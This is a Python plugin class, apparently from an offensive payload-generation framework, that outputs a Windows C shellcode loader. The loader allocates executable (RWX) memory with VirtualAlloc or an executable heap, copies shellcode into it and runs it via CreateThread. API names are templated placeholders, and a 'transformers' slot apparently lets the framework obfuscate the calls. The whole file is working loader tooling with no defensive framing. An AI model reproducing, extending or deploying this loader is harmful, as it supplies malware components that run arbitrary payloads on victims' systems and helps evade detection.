from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        self.allocation = 'VirtualAlloc'
        if 'allocation' in arguments:
            self.allocation = arguments['allocation']

        if self.allocation == 'VirtualAlloc':
            self.allocationCode = """
    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
"""
        elif self.allocation == 'HeapAlloc':
            self.allocationCode = """
    HANDLE hHeap = {HeapCreate}(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
    LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
"""

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def apicalls(self) -> list[str]:
        return ['CreateThread',
                'WaitForSingleObject',
                'CloseHandle',
                'VirtualAlloc',
                'HeapAlloc',
                'HeapCreate',
                'VirtualFree']

    def template(self) -> str:
        return Template("""
    {transformers}
    // Allocate a region of RWX memory for shellcode
    $allocation

    // Copy our shellcode into memory that we just allocated (inside of our current process)
    memcpy(buffer, shellcode, {shellcodeSize});


    // Create thread to run shellcode
    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    // Wait for thread to finish
    {WaitForSingleObject}(hThread, INFINITE);
    {CloseHandle}(hThread);

    // Clean up by freeing the memory we allocated for our shellcode
    {VirtualFree}(buffer, 0, MEM_RELEASE);

    return 0;
""").substitute(allocation=self.allocationCode)